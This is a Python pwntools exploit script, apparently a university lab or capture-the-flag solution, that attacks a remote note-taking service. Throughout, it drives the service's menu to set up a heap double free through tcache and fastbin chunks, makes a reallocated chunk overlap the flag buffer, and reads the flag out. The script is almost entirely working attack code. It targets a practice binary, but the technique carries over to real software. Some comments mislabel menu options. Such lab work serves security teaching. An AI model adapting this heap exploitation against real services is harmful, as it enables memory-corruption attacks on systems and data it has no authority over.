from pwn import *

# Launch exploit process
#p = gdb.debug("./lab9-1.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab9-1.bin")              # run exploit against binary locally without attacking the process to gdb
p = remote("csc748.hostbin.org", 7091)   # run the exploit against a remote process

notes = "ABCDEFGHI"

# Allocate 9 equal chunks from the top chunk
for note in notes:
	menu = p.recvuntil("What would you like to do?: ")
	print(menu.decode("utf-8"))
	menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Load flag into memory")
	print(menu.decode("utf-8"))
	menu = p.recvuntil("Choice: ")
	print(menu.decode("utf-8"))
	# Send menu selection "New"
	p.sendline(b'1')
	# Get contents
	contents = p.recvuntil("Contents: ")
	print(contents.decode("utf-8"))
	p.sendline(note * 16)
	# Get message
	message = p.recvline()
	print(message.decode("utf-8"))
	print("\n")

# Free all 9 chunks to establish an Tcache list with the first 7 chunks (ID#0 thru ID#6) and Fastbin list with the last 2 chunks (ID#7 and ID#8)
for bufferID in range(10):
	menu = p.recvuntil("What would you like to do?: ")
	print(menu.decode("utf-8"))
	print("\n")
	menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Load flag into memory")
	print(menu.decode("utf-8"))
	menu = p.recvuntil("Choice: ")
	print(menu.decode("utf-8"))
	# Send menu selection "Delete"
	p.sendline(b'3')
	# Get message
	message = p.recvuntil("Note ID?: ")
	print(message.decode("utf-8"))
	p.sendline(str(bufferID))
	print("\n")

# Free chunk ID#7 again (Double Free) to add a 3rd chunk (ID#9) on Fastbin list, this 3rd chunk points back to chunk ID#7's buffer on Fastbin list
print("\n")
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Load flag into memory")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "Delete"
p.sendline(b'3')
# Get message
message = p.recvuntil("Note ID?: ")
print(message.decode("utf-8"))
p.sendline(b'7')
print("\n")

# Allocate 9 equal chunks from the Tcache (all 7 on the list) and Fastbin (first 2 of 3 on the list)
for note in notes:
	menu = p.recvuntil("What would you like to do?: ")
	print(menu.decode("utf-8"))
	menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Load flag into memory")
	print(menu.decode("utf-8"))
	menu = p.recvuntil("Choice: ")
	print(menu.decode("utf-8"))
	# Send menu selection "New"
	p.sendline(b'1')
	# Get contents
	contents = p.recvuntil("Contents: ")
	print(contents.decode("utf-8"))
	p.sendline(note * 16)
	# Get message
	message = p.recvline()
	print(message.decode("utf-8"))
	print("\n")

# Allocate the flag to chunk ID#9, this will be the 3rd chunk from Fastbin, however it overwrites the content loaded to chunk ID#7's.
print("\n")
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Load flag into memory")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "New"
p.sendline(b'5')
print("\n")

# Read the flag loaded in chunk ID#7's buffer 
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Load flag into memory")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "Edit"
p.sendline(b'2')
# Get message
message = p.recvuntil("Note ID?: ")
print(message.decode("utf-8"))
p.sendline(b'7')
# Get contents
contents = p.recvuntil("}")
print(contents.decode("utf-8")) 
print("\n")

# Present menu prompt 
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Load flag into memory")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))

